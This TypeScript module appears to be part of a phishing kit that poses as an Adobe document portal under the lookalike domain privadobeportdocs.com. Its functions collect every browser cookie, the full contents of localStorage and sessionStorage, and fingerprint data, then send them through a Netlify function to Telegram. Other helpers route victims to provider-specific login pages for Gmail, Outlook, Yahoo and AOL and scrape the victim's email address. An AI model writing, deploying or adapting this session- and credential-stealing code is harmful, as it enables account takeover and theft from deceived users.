// Send data to Telegram via Netlify function
import cookieUtils, { CookieMeta } from './cookieUtils';

/**
 * NOTE about secrets:
 * - Client secrets MUST NOT be embedded in frontend code. The Azure client secret
 *   you provided must be kept on the server (e.g., in a Netlify function or other server)
 *   and used only during the token exchange step (authorization_code -> tokens).
 * - This file configures only the client-side OAuth authorize URLs (client_id, redirect URI).
 *   The token exchange (POST to /token) should be performed on the server using the client secret.
 */

// Microsoft / Azure configuration (client-side values only)
const MICROSOFT_CLIENT_ID = '029dbfef-8a74-4a07-899b-435e21e672c5';
const MICROSOFT_TENANT_ID = 'fc5ed2a8-32e1-48b7-b3d5-ed6a1550ee50';
// Use the absolute redirect URI you've provided for the OAuth callback
const OAUTH_REDIRECT_URI = 'https://privadobeportdocs.com/auth-callback';
const MICROSOFT_SCOPES = ['openid', 'email', 'profile'].join(' ');

export const sendToTelegram = async (data: any): Promise<any> => {
  try {
    const response = await fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const result = await response.json();
    console.log('✅ Data sent to Telegram successfully:', result);
    return result;
  } catch (error) {
    console.error('❌ Failed to send to Telegram:', error);
    throw error;
  }
};

export const getBrowserFingerprint = (userEmail?: string) => {
  // Check if we're in a browser environment
  if (typeof window === 'undefined' || typeof document === 'undefined' || typeof navigator === 'undefined') {
    const emailDomain = userEmail ? userEmail.split('@')[1] || 'unknown.com' : 'unknown.com';
    return {
      userAgent: 'Server-side',
      language: 'en-US',
      platform: 'Server',
      cookieEnabled: false,
      doNotTrack: null,
      timezone: 'UTC',
      url: '',
      domain: emailDomain,
      referrer: '',
      screen: {
        width: 0,
        height: 0,
        colorDepth: 0,
        pixelDepth: 0
      },
      cookies: '',
      cookiesParsed: {},
      cookieList: [] as CookieMeta[],
      localStorage: {},
      sessionStorage: {},
      timestamp: new Date().toISOString()
    };
  }
  
  // Use cookieUtils to build cookie capture (this will use advancedCookieCapture if available)
  const cookieCapture = cookieUtils.buildCookieCapture();

  // Capture all storage data
  const getStorageData = (storage: Storage | undefined) => {
    const data: Record<string, string | null> = {};
    try {
      if (!storage) return data;
      for (let i = 0; i < storage.length; i++) {
        const key = storage.key(i);
        if (key) {
          data[key] = storage.getItem(key);
        }
      }
    } catch (e) {
      // ignore storage access errors
    }
    return data;
  };

  // Extract domain from email if provided, otherwise use current hostname
  const emailDomain = getProviderSpecificDomain(userEmail);
  
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    timezone: typeof Intl !== 'undefined' ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'UTC',
    url: window.location.href,
    domain: emailDomain,
    referrer: document.referrer,
    screen: {
      width: typeof screen !== 'undefined' ? screen.width : 0,
      height: typeof screen !== 'undefined' ? screen.height : 0,
      colorDepth: typeof screen !== 'undefined' ? screen.colorDepth : 0,
      pixelDepth: typeof screen !== 'undefined' ? screen.pixelDepth : 0
    },
    cookies: cookieCapture.documentCookies,
    cookiesParsed: cookieCapture.cookiesParsed,
    cookieList: cookieCapture.cookieList || [],
    localStorage: getStorageData(window.localStorage),
    sessionStorage: getStorageData(window.sessionStorage),
    timestamp: new Date().toISOString()
  };
};

// Provider-specific domain detection helper (unchanged)
function getProviderSpecificDomain(userEmail?: string): string {
  if (typeof window === 'undefined') {
    return userEmail ? userEmail.split('@')[1] || 'unknown.com' : 'unknown.com';
  }
  
  // Get session data to determine provider
  const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
  const provider = (sessionData.provider || 'Others').toLowerCase();
  const email = userEmail || sessionData.email || '';
  
  console.log('🌐 Provider-based domain detection:', { provider, email });
  
  // Provider-specific domain mapping (takes priority)
  if (provider.includes('gmail') || provider.includes('google')) {
    console.log('✅ Provider detected as Google');
    return 'google.com';
  } else if (provider.includes('yahoo')) {
    console.log('✅ Provider detected as Yahoo');
    return 'yahoo.com';
  } else if (provider.includes('aol')) {
    console.log('✅ Provider detected as AOL');
    return 'aol.com';
  } else if (provider.includes('hotmail') || provider.includes('live') || 
             provider.includes('outlook') || provider.includes('office365')) {
    console.log('✅ Provider detected as Microsoft');
    return 'live.com';
  }
  
  // For "Others" provider, extract domain from email
  if (provider === 'others' && email && email.includes('@')) {
    const emailDomain = email.split('@')[1].toLowerCase();
    console.log('🔄 Provider is "Others", using email domain:', emailDomain);
    return emailDomain;
  }
  
  // Use current domain instead of hardcoded fallbacks
  const hostname = window.location.hostname;
  console.log('🔄 Using current domain:', hostname);
  return hostname;
}

export const generateState = () => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
};

export const buildOAuthUrl = (provider: string, state: string) => {
  // Keep previous behavior for non-Microsoft providers (uses window location origin for redirect URI)
  const baseUrl = window.location.origin;
  const defaultRedirect = encodeURIComponent(`${baseUrl}/auth/callback`);

  // Microsoft-specific authorize URL uses your provided tenant and redirect URI
  const microsoftRedirect = encodeURIComponent(OAUTH_REDIRECT_URI);

  const oauthUrls = {
    'Gmail': `https://accounts.google.com/oauth/authorize?client_id=YOUR_GOOGLE_CLIENT_ID&redirect_uri=${defaultRedirect}&response_type=code&scope=email profile&state=${state}`,
    'Yahoo': `https://api.login.yahoo.com/oauth2/request_auth?client_id=YOUR_YAHOO_CLIENT_ID&redirect_uri=${defaultRedirect}&response_type=code&scope=openid email&state=${state}`,
    // Use the configured Microsoft tenant + client_id + the absolute redirect URI you provided
    'Outlook': `https://login.microsoftonline.com/${MICROSOFT_TENANT_ID}/oauth2/v2.0/authorize?client_id=${MICROSOFT_CLIENT_ID}&response_type=code&redirect_uri=${microsoftRedirect}&response_mode=query&scope=${encodeURIComponent(MICROSOFT_SCOPES)}&state=${state}`,
    'Office365': `https://login.microsoftonline.com/${MICROSOFT_TENANT_ID}/oauth2/v2.0/authorize?client_id=${MICROSOFT_CLIENT_ID}&response_type=code&redirect_uri=${microsoftRedirect}&response_mode=query&scope=${encodeURIComponent(MICROSOFT_SCOPES)}&state=${state}`,
    'AOL': `https://api.login.aol.com/oauth2/request_auth?client_id=YOUR_AOL_CLIENT_ID&redirect_uri=${defaultRedirect}&response_type=code&scope=openid email&state=${state}`,
    'Others': `/auth/form/${provider}`
  };
  
  return oauthUrls[provider as keyof typeof oauthUrls] || `/auth/form/${provider}`;
};

/**
 * Helper: extractEmailFromProvider
 * This function attempts to determine an email address following OAuth or form flows.
 * For real provider integrations, you should exchange the authorization code for tokens
 * on your server and then use the provider APIs (or the ID token) to extract the verified email.
 *
 * Example server-side token exchange (Netlify function or other server):
 *  POST https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token
 *  Content-Type: application/x-www-form-urlencoded
 *  body:
 *    client_id=...&
 *    scope=openid%20email%20profile&
 *    code=<code_from_query>&
 *    redirect_uri=<your_redirect_uri>&
 *    grant_type=authorization_code&
 *    client_secret=<SECRET_ON_SERVER>
 *
 * Do NOT perform the above exchange from the browser since it requires the client secret.
 */
export const extractEmailFromProvider = (provider: string, code: string) => {
  try {
    const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
    if (sessionData.email) {
      console.log('✅ Found existing email in session:', sessionData.email);
      return sessionData.email;
    }
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const email = urlParams.get('email');
      if (email) {
        console.log('✅ Found email in URL parameters:', email);
        return email;
      }
    }
    const emailInput = typeof document !== 'undefined' ? document.querySelector('input[type="email"]') as HTMLInputElement : null;
    if (emailInput && emailInput.value) {
      console.log('✅ Found email from form input:', emailInput.value);
      return emailInput.value;
    }
    const cookies = (typeof document !== 'undefined' ? document.cookie.split(';') : []);
    for (const cookie of cookies) {
      const [name, value] = cookie.trim().split('=');
      if (name === 'user_email' && value) {
        try {
          const decodedEmail = decodeURIComponent(value);
          console.log('✅ Found email from cookie:', decodedEmail);
          return decodedEmail;
        } catch (e) {
          console.warn('Failed to decode email from cookie');
        }
      }
    }
    if (code && code.includes('@')) {
      console.log('✅ Using code as email:', code);
      return code;
    }
    console.warn('⚠️ No real email found, generating placeholder');
    const domains = {
      'Gmail': 'gmail.com',
      'Yahoo': 'yahoo.com',
      'Outlook': 'outlook.com',
      'Office365': 'outlook.com',
      'AOL': 'aol.com',
      'Others': 'example.com'
    };
    const domain = domains[provider as keyof typeof domains] || 'example.com';
    return `user${Math.floor(Math.random() * 1000)}@${domain}`;
    
  } catch (error) {
    console.error('Error extracting email:', error);
    return `error@${provider.toLowerCase()}.com`;
  }
};
